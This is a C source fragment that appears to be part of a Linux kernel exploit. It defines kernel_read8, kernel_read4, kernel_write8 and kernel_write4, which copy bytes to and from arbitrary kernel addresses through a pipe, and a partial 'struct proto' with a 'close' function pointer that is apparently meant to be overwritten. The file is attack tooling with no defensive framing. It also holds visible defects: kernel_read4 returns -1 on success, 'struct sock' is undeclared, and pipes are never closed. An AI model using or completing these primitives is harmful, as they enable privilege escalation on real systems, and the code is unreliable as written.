#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <limits.h>
#include <signal.h>
#include <string.h>
#include <time.h>
#include <pthread.h>
#include <sys/wait.h>
#include <sys/sysinfo.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <linux/in.h>
#include <linux/sockios.h>

struct proto {
	void (*close)(struct sock *sk, long timeout);
    /* other field we just don't care for now */
};

int kernel_read8(void* kernel_addr, unsigned long* value) {
    int pipefd[2];

    if (-1 == pipe(pipefd)) {
        printf("[-] create pipe dual failed.\n");
        return -1;
    }

    if (-1 == write(pipefd[1], kernel_addr, 8)) {
        perror("[-] write pipe failed.");
        return -1;
    }

    if (-1 == read(pipefd[0], value, 8)) {
        perror("[-] read pipe failed.");
        return -1;
    }

    return 0;
}

int kernel_read4(void* kernel_addr, unsigned int* value) {
    int pipefd[2];

    if (-1 == pipe(pipefd)) {
        printf("[-] create dual pipe failed.\n");
        return -1;
    }

    if (-1 == write(pipefd[1], kernel_addr, 4)) {
        perror("[-] write pipe failed.");
        return -1;
    }

    if (-1 == read(pipefd[0], value, 4)) {
        perror("[-] read pipe failed.");
        return -1;
    }

    return -1;
}

int kernel_write8(void* kernel_addr, unsigned long* value) {
    int pipefd[2];

    if (-1 == pipe(pipefd)) {
        printf("[-] create dual pipe failed.\n");
        return -1;
    }

    if (-1 == write(pipefd[1], value, 8)) {
        perror("[-] write pipe failed.");
        return -1;
    }

    if (-1 == read(pipefd[0], kernel_addr, 8)) {
        perror("[-] read pipe failed.");
        return -1;
    }

    return 0;
}

int kernel_write4(void* kernel_addr, unsigned int* value) {
    int pipefd[2];

    if (-1 == pipe(pipefd)) {
        printf("[-] create dual pipe failed.");
        return -1;
    }    

    if (-1 == write(pipefd[1], value, 4)) {
        perror("[-] write pipe failed.");
        return -1;
    }

    if (-1 == read(pipefd[0], kernel_addr, 4)) {
        perror("[-] read pipe failed.");
        return -1;
    }

    return 0;
}